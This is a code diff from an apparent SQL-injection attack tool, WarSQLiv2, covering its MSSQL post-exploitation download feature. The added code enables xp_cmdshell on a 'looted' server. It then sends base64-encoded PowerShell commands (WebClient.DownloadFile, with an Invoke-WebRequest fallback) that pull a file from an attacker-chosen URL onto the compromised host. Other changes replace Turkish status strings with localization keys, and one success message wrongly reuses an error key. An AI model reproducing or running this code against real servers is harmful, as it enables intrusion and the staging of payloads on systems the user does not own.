@@ -91,7 +91,37 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
         }
         private void btnDownload_Click(object sender, RoutedEventArgs e)
         {
-            Dispatcher.Invoke((Action)delegate
+            var isActivated = cmdControl.isActivated;
+            var isExecuted = cmdControl.isExecuted;
+            if (isActivated == false && isExecuted == false)
+            {
+                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
+                try
+                {
+                    Dispatcher.Invoke((Action)delegate
+                    {
+                        enableXpCmdShell.XpCmdShellStatus();
+                        txtStatus.AppendText(enableXpCmdShell.Result);
+                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                        if (contains == true)
+                        {
+                            isActivated = true;
+                            isExecuted = true;
+                        }
+                    });
+                }
+                catch (Exception)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText(enableXpCmdShell.CmdException);
+                    });
+                }
+            }
+            if (isExecuted == true && isActivated == true)
+            {
+                Dispatcher.Invoke((Action)delegate
                 {
                     var clearText = "(new-object System.Net.WebClient).DownloadFile('" + txtUrl.Text + "', '" + txtSaveLocation.Text + "')";
                     clearText = EncodeBase64.ConvertTextToBase64NonBypass(clearText);
@@ -100,6 +130,8 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
                     txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload5")}");
                     RevConn(_execCode);
                 });
+            }
+            
         }
         private void RevConn(string execCode)
         {
@@ -123,19 +155,19 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
                             }
                             else if(isError == true)
                             {
-                                txtStatus.AppendText(Environment.NewLine + "Sunucu adresi çözümlenemedi, dosya indirilemedi.");
+                                txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageDownload6"));
                             }
                             else if (isError == false)
                             {
                                 var result2 = result.Contains("Completed");
                                 if (result2 == true)
                                 {
-                                    txtStatus.AppendText(Environment.NewLine + "Dosya indirildi " + txtSaveLocation.Text);
+                                    txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageDownload8") + txtSaveLocation.Text);
                                 }
                             }
                             if (isError == true)
                             {
-                                txtStatus.AppendText(Environment.NewLine + "Dosya indirme tekniği değiştiriliyor");
+                                txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageDownload7"));
                                 _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                                 txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload5")}");
                                 var expCode = EncodeBase64.ConvertTextToBase64NonBypass("Invoke-WebRequest \"" + txtUrl.Text +"\" -OutFile \""+ txtSaveLocation.Text + "\"");
@@ -150,11 +182,11 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
                                 }
                                 else if (isError == true)
                                 {
-                                    txtStatus.AppendText(Environment.NewLine + "Sunucu adresi çözümlenemedi, dosya indirilemedi.");
+                                    txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageDownload6"));
                                 }
                                 else if (isError == false)
                                 {
-                                    txtStatus.AppendText(Environment.NewLine + "Dosya indirildi " + txtSaveLocation.Text);
+                                    txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageDownload6") + txtSaveLocation.Text);
                                 }
                             }
                         });
